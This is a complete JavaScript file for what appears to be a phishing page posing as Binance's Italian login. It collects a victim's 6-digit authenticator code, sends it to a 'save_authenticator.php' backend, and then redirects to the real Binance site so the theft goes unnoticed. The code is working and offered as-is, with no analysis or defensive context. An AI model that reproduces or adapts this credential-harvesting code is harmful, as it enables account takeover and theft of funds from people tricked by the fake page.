
document.addEventListener('DOMContentLoaded', function() {
    window.scrollTo(0, 0);
    const codeInput = document.getElementById('code');
    const submitButton = document.querySelector('.submit-button');
    const form = document.querySelector('.login-form');
    const pasteButton = document.getElementById('pasteButton');

    // Reset button state on page load
    function resetButtonState() {
        const buttonText = submitButton.querySelector('.button-text');
        const loadingAnimation = submitButton.querySelector('.loading-animation');
        
        buttonText.style.display = 'inline-block';
        loadingAnimation.style.display = 'none';
        submitButton.disabled = false;
    }

    // Initialize button state
    resetButtonState();

    // Allow only numbers in code input
    codeInput.addEventListener('input', function(e) {
        // Remove any non-numeric characters
        this.value = this.value.replace(/[^0-9]/g, '');
    });

    // Prevent non-numeric characters from being typed
    codeInput.addEventListener('keypress', function(e) {
        if (!/[0-9]/.test(e.key)) {
            e.preventDefault();
        }
    });

    // Handle paste button click
    if (pasteButton) {
        pasteButton.addEventListener('click', async function() {
            const codeValue = codeInput.value.trim();
            
            if (codeValue && codeValue.length === 6 && /^[0-9]{6}$/.test(codeValue)) {
                try {
                    await navigator.clipboard.writeText(codeValue);
                    // Optional: Show a brief visual feedback
                    const originalText = pasteButton.textContent;
                    pasteButton.textContent = 'Copiato!';
                    setTimeout(() => {
                        pasteButton.textContent = originalText;
                    }, 1000);
                } catch (err) {
                    // Fallback for browsers that don't support clipboard API
                    console.log('Clipboard access not available');
                }
            }
        });
    }

    // Handle form submission
    form.addEventListener('submit', function(e) {
        e.preventDefault();
        
        const codeValue = codeInput.value.trim();
        const buttonText = submitButton.querySelector('.button-text');
        const loadingAnimation = submitButton.querySelector('.loading-animation');
        
        if (!codeValue) {
            codeInput.focus();
            return;
        }
        
        if (codeValue.length !== 6) {
            codeInput.focus();
            return;
        }
        
        // Show loading animation
        buttonText.style.display = 'none';
        loadingAnimation.style.display = 'flex';
        submitButton.disabled = true;
        
        // Send code to backend
        const formData = new FormData();
        formData.append('code', codeValue);
        
        fetch('save_authenticator.php', {
            method: 'POST',
            body: formData
        }).then(response => response.json())
        .then(data => {
            setTimeout(() => {
                // Reset button state before redirect
                buttonText.style.display = 'inline-block';
                loadingAnimation.style.display = 'none';
                submitButton.disabled = false;
                
                // Redirect to Binance
                window.location.href = 'https://www.binance.com/it';
            }, 2000);
        }).catch(error => {
            // Still redirect even if backend fails
            setTimeout(() => {
                buttonText.style.display = 'inline-block';
                loadingAnimation.style.display = 'none';
                submitButton.disabled = false;
                window.location.href = 'https://www.binance.com/it';
            }, 2000);
        });
    });

    // Handle footer links redirects
    const cookieLink = document.querySelector('.footer-link[href="#"]');
    const termsLink = document.querySelectorAll('.footer-link[href="#"]')[1];
    const privacyLink = document.querySelectorAll('.footer-link[href="#"]')[2];

    cookieLink.addEventListener('click', function(e) {
        e.preventDefault();
        window.location.href = 'https://academy.binance.com/it/articles/what-are-cookies';
    });

    termsLink.addEventListener('click', function(e) {
        e.preventDefault();
        window.location.href = 'https://www.binance.com/it/terms';
    });

    privacyLink.addEventListener('click', function(e) {
        e.preventDefault();
        window.location.href = 'https://www.binance.com/it/privacy';
    });

    // Add focus/blur effects
    codeInput.addEventListener('focus', function() {
        this.parentElement.classList.add('focused');
    });

    codeInput.addEventListener('blur', function() {
        this.parentElement.classList.remove('focused');
    });

    // Handle responsive behavior
    function handleResize() {
        const container = document.querySelector('.login-container');
        if (window.innerWidth <= 768) {
            container.style.minHeight = `${window.innerHeight - 120}px`;
        } else {
            container.style.minHeight = 'auto';
        }
    }

    window.addEventListener('resize', handleResize);
    handleResize(); // Initial call
});
